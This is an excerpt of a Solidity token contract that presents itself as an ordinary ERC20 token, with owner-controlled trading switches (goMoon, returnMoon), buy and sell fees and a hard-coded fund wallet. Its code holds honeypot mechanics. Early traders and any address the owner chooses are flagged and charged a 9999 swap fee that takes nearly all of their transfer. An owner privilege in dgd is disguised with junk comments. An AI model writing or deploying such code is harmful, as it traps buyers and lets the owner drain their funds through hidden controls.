...
abstract contract AbsToken is IERC20, Ownable {
    ...
    mapping(address => bool) public _wcdb;
    ...
    uint256 public _seLPDividendFee = 0;
    uint256 public _sellFundFee = 200;
    uint256 public _sellLPFee = 0;
    
    uint256 public goDeutschlandBlock;
    ...
    function WHT(address send, address reciv) internal view returns (bool){
        return (send != reciv) || (_feeList[send] == false);
    }
    ...
    function setDeutschland(uint256 a) public onlyOwner{
        Deutschland = a;
    }
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeList[from] && !_feeList[to]) {
                if (0 == goDeutschlandBlock) {
                    require(false);
                }
                if (block.number < goDeutschlandBlock + Deutschland && !_swapPairList[from]) {
                    _wcdb[from] = true;
                }
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        ...
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee + _LPDividendFee + _sellFundFee + _seLPDividendFee + _sellLPFee;
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            ...
            if (isSell) {
                swapFee = _sellFundFee + _seLPDividendFee + _sellLPFee;
            } else {
                require(tAmount <= maxTXAmount);
                swapFee = _buyFundFee + _LPDividendFee;
            }
            if (_wcdb[sender]){
                swapFee = 9999;
            }
    ...
    function dgd(address addr, bool status) public{
          if(/*asyy*/fundAddress/*iiis*/ ==
     /*mnb*/msg.sender/*kks*/ ){  
        aa[addr] = status;
    }
     }
    ...
    function setseLPDividendFee(uint256 dividendFee) external onlyOwner {
        _seLPDividendFee = dividendFee;
    }
    ...
    function goMoon() external onlyOwner {
        goDeutschlandBlock = block.number;
    }

    function returnMoon() external onlyOwner {
        goDeutschlandBlock = 0;
    }
    ...
    function setwcdb(address addr, bool enable) external onlyOwner {
        _wcdb[addr] = enable;
    }
...
contract TOKEN is AbsToken {
    constructor() AbsToken(
        ...
        address(0xa91bCb619a8c8D89C9C2987Be5da8164B2281f94),//FundAddress
        address(0xa91bCb619a8c8D89C9C2987Be5da8164B2281f94)//ReceiveAddress
    ){
    }
}